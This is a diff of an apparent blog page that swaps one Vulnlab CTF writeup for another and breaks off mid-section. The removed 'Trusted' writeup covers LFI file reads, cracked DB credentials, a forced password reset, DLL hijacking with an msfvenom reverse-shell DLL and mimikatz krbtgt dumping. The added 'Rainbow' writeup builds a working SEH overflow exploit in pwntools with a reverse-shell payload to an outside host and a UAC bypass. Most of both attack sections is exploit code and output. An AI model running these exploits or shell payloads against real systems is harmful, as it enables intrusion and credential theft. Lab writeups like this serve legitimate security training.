@@ -9,26 +9,26 @@
     <meta name="generator" content="Retype 3.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>Trusted</title>
-    <meta name="title" content="Trusted">
-    <meta name="description" content="IPs: 10.10.217.117 10.10.217.118">
+    <title>Rainbow</title>
+    <meta name="title" content="Rainbow">
+    <meta name="description" content="IP: 10.10.111.194">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/trusted/">
+    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/rainbow/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/trusted/">
-    <meta property="og:title" content="Trusted">
-    <meta property="og:description" content="IPs: 10.10.217.117 10.10.217.118">
-    <meta property="og:image" content="https://eljayright.github.io/writeups/vulnlab/trusted/images/trusted.png">
+    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/rainbow/">
+    <meta property="og:title" content="Rainbow">
+    <meta property="og:description" content="IP: 10.10.111.194">
+    <meta property="og:image" content="https://eljayright.github.io/writeups/vulnlab/rainbow/images/rainbow.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/trusted/">
-    <meta property="twitter:title" content="Trusted">
-    <meta property="twitter:description" content="IPs: 10.10.217.117 10.10.217.118">
-    <meta property="twitter:image" content="https://eljayright.github.io/writeups/vulnlab/trusted/images/trusted.png">
+    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/rainbow/">
+    <meta property="twitter:title" content="Rainbow">
+    <meta property="twitter:description" content="IP: 10.10.111.194">
+    <meta property="twitter:image" content="https://eljayright.github.io/writeups/vulnlab/rainbow/images/rainbow.png">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -179,272 +179,285 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="trusted" class="break-words">
+<doc-anchor-target id="rainbow" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#trusted">#</doc-anchor-trigger>
-        <span>Trusted</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#rainbow">#</doc-anchor-trigger>
+        <span>Rainbow</span>
     </h1>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/trusted.png" alt="">
+    <img src="images/rainbow.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>IPs: <code v-pre>10.10.217.117</code> <code v-pre>10.10.217.118</code></p>
+<p>IP: <code v-pre>10.10.111.194</code></p>
+<doc-anchor-target id="outline">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#outline">#</doc-anchor-trigger>
+        <span>Outline</span>
+    </h1>
+</doc-anchor-target>
+<p>This is a bit different to the other boxes and instead focuses on binary exploitation. We are given a simple POC to crash the application:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">#!/usr/bin/python
+from pwn import *
+from urllib import parse
+from time import sleep
+from sys import argv,exit
+from os import system
+  
+HOST = b&quot;&quot;
+PORT = 8080
+ 
+buffer = b&quot;A&quot;*900
+content = buffer
+payload =  b&quot;POST / HTTP/1.1\r\n&quot;
+payload += b&quot;Host: %s\r\n&quot; % HOST
+payload += b&quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n&quot;
+payload += b&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n&quot;
+payload += b&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;
+payload += b&quot;Content-Length: %d\r\n\r\n&quot; % len(content)
+payload += content
+
+p = remote(HOST, PORT)
+p.send(payload)
+p.close()</code></pre>
+</doc-codeblock></div>
 <doc-anchor-target id="recon">
     <h1>
         <doc-anchor-trigger class="header-anchor-trigger" to="#recon">#</doc-anchor-trigger>
         <span>Recon</span>
     </h1>
 </doc-anchor-target>
-<p>Nmap:
-10.10.217.117 trusteddc.trusted.vl</p>
+<p>Nmap scan:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
-88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:29Z)
-135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds? syn-ack ttl 127
-464/tcp  open  kpasswd5?     syn-ack ttl 127
-593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped    syn-ack ttl 127
-3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped    syn-ack ttl 127
-3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
-5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+<pre class="language-none"><code v-pre class="language-none">Nmap scan report for 10.10.111.194
+Host is up (0.28s latency).
+Not shown: 993 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-proxy</code></pre>
 </doc-codeblock></div>
-<p>10.10.217.118 labdc.lab.trusted.vl</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
-80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
-88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:18Z)
-135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
-445/tcp  open  microsoft-ds? syn-ack ttl 127
-464/tcp  open  kpasswd5?     syn-ack ttl 127
-593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped    syn-ack ttl 127
-3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped    syn-ack ttl 127
-3306/tcp open  mysql         syn-ack ttl 127 MariaDB 5.5.5-10.4.24
-3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
-5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
-</doc-codeblock></div>
-<p>Seems to be a parent and child domain which will be interesting.</p>
-<p>Checking port 80 shows that xampp <code v-pre>XAMPP for Windows 8.1.6</code> is running, this has a webdav exploit <a href="https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit">https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit</a> but the endpoint doesn&#x27;t seem to exist.</p>
-<p>Fuzzing with <code v-pre>ffuf</code> shows a <code v-pre>/dev</code> endpoint:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.217.118/FUZZ
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.10.217.118/FUZZ
- :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
-
-...snip...
-dev                     [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 283ms]</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="foothold">
+<p>FTP has anonymous auth, logging in shows the rainbow.exe binary.</p>
+<doc-anchor-target id="binary-exploitation">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
-        <span>Foothold</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#binary-exploitation">#</doc-anchor-trigger>
+        <span>Binary Exploitation</span>
     </h1>
 </doc-anchor-target>
-<p>On the main page there is a note:</p>
+<p>I&#x27;m going to copy the binary across to a windows machine and set up a debugger so we can analyse and debug crashes.</p>
+<p>With this done firing off the POC from above gives:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">Eric please take a look at this if you have the time. I tried to implement some php code and set up the database connection but it doesn't seem to work. Could you fix it please?</code></pre>
+<pre class="language-none"><code v-pre class="language-none">(28a0.2304): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=fffffffc ebx=004e16b0 ecx=41414141 edx=00000004 esi=004020c0 edi=004e16b0
+eip=00406156 esp=007ef8c4 ebp=007ef8d4 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+Rainbow+0x6156:
+00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:4141413d=????????</code></pre>
 </doc-codeblock></div>
-<p>The URI path for the website also looks very interesting:</p>
+<p>As eip / esp are not smashed, thinking it might be SEH:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">https://10.10.217.118/dev/index.html?view=index.html</code></pre>
+<pre class="language-none"><code v-pre class="language-none">0:001&gt; !exchain
+007ef8e4: Rainbow+a040 (0040a040)
+007ef924: Rainbow+a040 (0040a040)
+007efbe4: 41414141
+Invalid exception stack at 41414141</code></pre>
 </doc-codeblock></div>
-<p>Using this we are able to read arb files:</p>
+<p>Yep.</p>
+<p>Before finding the offset, we should check the protections of the binary:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\Windows\System32\drivers\etc\hosts
-
-IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=</code></pre>
+<pre class="language-none"><code v-pre class="language-none">binary-security-check ~/vulnlab/rainbow/rainbow.exe 
+/home/eljay/vulnlab/rainbow/rainbow.exe: !CHECKSUM !DATA-EXEC-PREVENT !RUNS-IN-APP-CONTAINER +CONSIDER-MANIFEST !VERIFY-DIGITAL-CERT !CONTROL-FLOW-GUARD !HANDLES-ADDR-GT-2GB !ASLR !SAFE-SEH</code></pre>
 </doc-codeblock></div>
-<p>Fuzzing again shows a file called <code v-pre>db.php</code></p>
+<p>No ASLR or DEP, so we can just use a simple <code v-pre>pop pop ret;</code> and execute shellcode on the stack.</p>
+<p>We should also consider bad bytes. As this is a POST request, <code v-pre>0x00, 0x0d, 0x0a</code> wont be valid.</p>
+<doc-anchor-target id="seh-offset">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#seh-offset">#</doc-anchor-trigger>
+        <span>SEH Offset</span>
+    </h2>
+</doc-anchor-target>
+<p>Updating the script to use a cyclic pattern for the body instead of A&#x27;s</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u 'https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php' -fw 55
+<pre class="language-none"><code v-pre class="language-none">max_buf = 0x384
+ 
+body = pwn.util.cyclic.cyclic_metasploit(max_buf)
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0
-________________________________________________
-
- :: Method           : GET
- :: URL              : https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php
- :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response words: 55
-________________________________________________
-
-db                      [Status: 200, Size: 1109, Words: 25, Lines: 31, Duration: 286ms]</code></pre>
+payload =  b&quot;POST / HTTP/1.1\r\n&quot;
+payload += b&quot;Host: %s\r\n&quot; % HOST
+payload += b&quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n&quot;
+payload += b&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n&quot;
+payload += b&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;
+payload += b&quot;Content-Length: %d\r\n\r\n&quot; % len(body)
+payload += body </code></pre>
 </doc-codeblock></div>
-<p>Which has db creds:</p>
+<p>Recrashing the application shows the NSEH record is now <code v-pre>0x77413177</code></p>
+<p>Validating the offset is right:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">&lt;?php 
-$servername = &quot;localhost&quot;;
-$username = &quot;root&quot;;
-$password = &quot;SuperSecureMySQLPassw0rd1337.&quot;;
+<pre class="language-none"><code v-pre class="language-none">max_buf = 0x384
+ 
+body = pwn.util.cyclic.cyclic_metasploit(max_buf)
+deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)
 
-$conn = mysqli_connect($servername, $username, $password);
-
-if (!$conn) {
-  die(&quot;Connection failed: &quot; . mysqli_connect_error());
-}
-echo &quot;Connected successfully&quot;;</code></pre>
+body = b&quot;A&quot;*deref_off
+body += b&quot;B&quot;*4
+body += b&quot;C&quot;*4
+body += b&quot;D&quot; * (max_buf - len(body))</code></pre>
 </doc-codeblock></div>
-<p>Logging into the db gives creds!</p>
+<p>So the NSEH record should be BBBB</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">+--------------+----------------------------------+
-| short_handle | password                         |
-+--------------+----------------------------------+
-| rsmith       | 7e7abb54bbef42f0fbfa3007b368def7 |
-| ewalters     | d6e81aeb4df9325b502a02f11043e0ad |
-| cpowers      | e3d3eb0f46fe5d75eed8d11d54045a60 |
-+--------------+----------------------------------+</code></pre>
+<pre class="language-none"><code v-pre class="language-none">0:003&gt; !exchain
+009ef8e4: Rainbow+a040 (0040a040)
+009ef924: Rainbow+a040 (0040a040)
+009efbe4: 42424242
+Invalid exception stack at 41414141</code></pre>
 </doc-codeblock></div>
-<p>Throwing these in hashcat gives:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">rsmith:IHateEric2</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="lateral-movement-to-ewalters">
+<p>Nice!</p>
+<doc-anchor-target id="redirecting-execution">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#lateral-movement-to-ewalters">#</doc-anchor-trigger>
-        <span>Lateral movement to ewalters</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#redirecting-execution">#</doc-anchor-trigger>
+        <span>Redirecting Execution</span>
     </h1>
 </doc-anchor-target>
-<p>Looking at shares, there isnt anything interesting we can read, so going to run bloodhound.</p>
-<p>Bloodhound shows that our user can forcechange the password of ewalters. So lets do that.</p>
+<p>Checking for PPRs with ropper:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">rpcclient -U 'rsmith' //labdc.lab.trusted.vl
-Can't load /etc/samba/smb.conf - run testparm to debug it
-Password for [WORKGROUP\rsmith]:
-rpcclient $&gt; setuserinfo2 ewalters 23 SecurePassword123@
-</code></pre>
+<pre class="language-none"><code v-pre class="language-none">ropper -f rainbow.exe --ppr
+POP;POP;RET Instructions
+========================
+0x004091b7: pop edi; pop esi; ret; 
+0x004092ad: pop ecx; pop ebp; ret; 
+0x004094d8: pop ecx; pop ecx; ret; 
+0x00409569: pop esi; pop ebp; ret; 
+0x00409657: pop esi; pop ebp; ret; 
+0x00409add: pop esi; pop ebx; ret; 
+0x00409b09: pop esi; pop ebx; ret; 
+0x00409b81: pop esi; pop ebp; ret; </code></pre>
 </doc-codeblock></div>
-<p>Then checking that it is set.</p>
+<p>All the gadgets start with a <code v-pre>0x00</code> which means we wont be able to use anything after this gadget. For now we can see where we land, and potentially use a <code v-pre>jmp</code> to go back to the start of the buffer, where the shellcode has already been written.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">nxc winrm labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
-WINRM       10.10.217.118   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
-WINRM       10.10.217.118   5985   LABDC            [+] lab.trusted.vl\ewalters:SecurePassword123@ (Pwn3d!)</code></pre>
+<pre class="language-none"><code v-pre class="language-none">max_buf = 0x384
+ 
+body = pwn.util.cyclic.cyclic_metasploit(max_buf)
+deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)
+ppr = 0x00409569 #pop esi; pop ebp; ret; 
+
+body = pwn.util.cyclic.cyclic_metasploit(deref_off)
+#body = b&quot;A&quot;*deref_off
+body += pwn.p32(ppr)
+body += b&quot;C&quot;*4
+body += b&quot;D&quot; * (max_buf - len(body))</code></pre>
 </doc-codeblock></div>
-<p>Nice! We can also login with winrm</p>
+<p>After the PPR <code v-pre>eip</code> is at <code v-pre>0x9efbe4</code> while the top of our input buffer is at <code v-pre>0x9ef950</code>, so a jump of <code v-pre>0x294</code> would place <code v-pre>eip</code> at the top of the stack.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">evil-winrm -i labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\ewalters\Documents&gt; </code></pre>
+<pre class="language-none"><code v-pre class="language-none">max_buf = 0x384
+ 
+body = pwn.util.cyclic.cyclic_metasploit(max_buf)
+deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)
+ppr = 0x00409569 #pop esi; pop ebp; ret; 
+
+body = pwn.util.cyclic.cyclic_metasploit(deref_off)
+eip_off = pwn.util.cyclic.cyclic_metasploit_find(0x41307741)
+
+body = b&quot;A&quot;*eip_off
+body += b&quot;B&quot;*4
+body += b&quot;A&quot;*(deref_off - len(body))
+body += pwn.p32(ppr)
+body += b&quot;C&quot;*4
+body += b&quot;D&quot; * (max_buf - len(body))</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="dll-hijack-to-da">
+<p>Running the above shows that we only have 4 btyes to do the <code v-pre>jmp</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">41414141 000000C8 41414141 41414141
+41414141 42424242 00409569 00000005</code></pre>
+</doc-codeblock></div>
+<p>What we can do is a short jump &quot;back&quot; 12 to the start of the <code v-pre>0x41</code>&#x27;s then a jump to the top of the buffer.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">body = b&quot;A&quot;*(eip_off -12)
+body += b&quot;\xE9\x73\xFD\xFF\xFF&quot;
+body += b&quot;\x90\x90\x90&quot;
+body += b&quot;\x90\x90\x90\x90&quot;
+
+body += b&quot;\xEB\xF2\x90\x90&quot;
+body += b&quot;A&quot;*(deref_off - len(body))
+body += pwn.p32(ppr)
+body += b&quot;C&quot;*4
+body += b&quot;D&quot; * (max_buf - len(body))</code></pre>
+</doc-codeblock></div>
+<p>This puts us back at the top of the payload leaving 624 bytes for a shell.</p>
+<doc-anchor-target id="testing-against-target">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#dll-hijack-to-da">#</doc-anchor-trigger>
-        <span>DLL Hijack to DA</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#testing-against-target">#</doc-anchor-trigger>
+        <span>Testing against target</span>
     </h1>
 </doc-anchor-target>
-<p>Looking around there is an AVTest directory with two files:
-<code v-pre>kasperskyremovaltool.exe</code> and <code v-pre>readme.txt</code></p>
-<p>The note mentions another user is expected to run this program:</p>
+<p>Using msfvenom:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">Since none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.
-I asked Christine to run them a few times, just to be sure.
-
-Let's just hope we don't have to set this lab up again because of this.</code></pre>
+<pre class="language-none"><code v-pre class="language-none">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.253 LPORT=9001 -f raw -o payload.bin -b '\x00\x0a\x0d'
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Saved as: payload.bin</code></pre>
 </doc-codeblock></div>
-<p>A potential privesc would be to see if we can dll hijack this application and get a reverse shell as the user running the application which should be an admin as AVTools love there high privs. :)</p>
-<p>To check for this you can load up procmon and check for missing imports, there are heaps of resources on how to do this.</p>
-<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a></p>
-<p>Do this you will see that the application tries to load <code v-pre>KasperskyRemovalToolENU.dll</code> a few times.
-So if we make a dll and call it <code v-pre>KasperskyRemovalToolENU.dll</code> and place it in the same location as the <code v-pre>kasperskyremovaltool.exe</code> we will get a shell.</p>
-<p>Being lazy and using msfvenom:</p>
+<p>prepending the payload and running it gives a shell!</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.110 LPORT=9001 -f dll -o KasperskyRemovalToolENU.dll</code></pre>
-</doc-codeblock></div>
-<p>Uploading the file and waiting a bit we get a shell as <code v-pre>cpowers</code> that happens to be a domain admin on the machine.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">whoami /groups
+<pre class="language-none"><code v-pre class="language-none">def payload():
+    with open(&quot;./payload.bin&quot;, &quot;rb&quot;) as f:
+        return f.read()
 
-GROUP INFORMATION
------------------
+max_buf = 0x384
+ 
+body = pwn.util.cyclic.cyclic_metasploit(max_buf)
+deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x77413177)
+ppr = 0x00409569 #pop esi; pop ebp; ret; 
+
+body = pwn.util.cyclic.cyclic_metasploit(deref_off)
+eip_off = pwn.util.cyclic.cyclic_metasploit_find(0x41307741)
+
+body = payload()
+body += b&quot;A&quot;*(eip_off -12 - len(body))
+body += b&quot;\xE9\x73\xFD\xFF\xFF&quot; # jmp 0xfffffd78
+body += b&quot;\x90\x90\x90&quot;
+body += b&quot;\x90\x90\x90\x90&quot;
+
+body += b&quot;\xEB\xF2\x90\x90&quot; # jmp short 0xfffffff4
+body += b&quot;A&quot;*(deref_off - len(body))
+body += pwn.p32(ppr)
+body += b&quot;C&quot;*4
+body += b&quot;D&quot; * (max_buf - len(body))</code></pre>
+</doc-codeblock></div>
+<p>Now to test it against the target.
+Swapping out the shellcode and IP, and it works!!</p>
+<doc-anchor-target id="root">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
+        <span>Root</span>
+    </h1>
+</doc-anchor-target>
+<p>Looking at the users groups:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">... snip ..
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
 ... snip ...
-BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
-LAB\Domain Admins                          Group            S-1-5-21-2241985869-2159962460-1278545866-512 Mandatory group, Enabled by default, Enabled group             
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288</code></pre>
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="forest-privesc">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#forest-privesc">#</doc-anchor-trigger>
-        <span>Forest Privesc</span>
-    </h1>
-</doc-anchor-target>
-<p>Going back to bloodhound shows that there is a parent domain called <code v-pre>trusted.vl</code> to priv esc into this domain and get enterprise admin we can grab the krbtgt hash for <code v-pre>lab.trusted.vl</code> and forge a golden ticket.
-To get this we can just do a dcsync on the dc with mimikatz.</p>
+<p>We are a member of administrators but not in a high integrity process. Going to run <a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a> to bypass UAC</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;
-..snip..
-User : krbtgt
-LM   : 
-NTLM : c7a03c565c68c6fac5f8913fab576ebd</code></pre>
+<pre class="language-none"><code v-pre class="language-none">C:\Windows\Tasks&gt;.\akagi64.exe 61 C:\Windows\Tasks\shell.exe
+.\akagi64.exe 61 C:\Windows\Tasks\shell.exe</code></pre>
 </doc-codeblock></div>
-<p>We also need the domain sid of both domains, both available from bloodhound.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">lab.trusted.vl S-1-5-21-2241985869-2159962460-1278545866
-trusted.vl S-1-5-21-3576695518-347000760-3731839591</code></pre>
-</doc-codeblock></div>
-<p>We can use the default Enterprise Admin groups SID being &lt;domain_sid&gt;-519</p>
-<p>Now to form the ticket:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
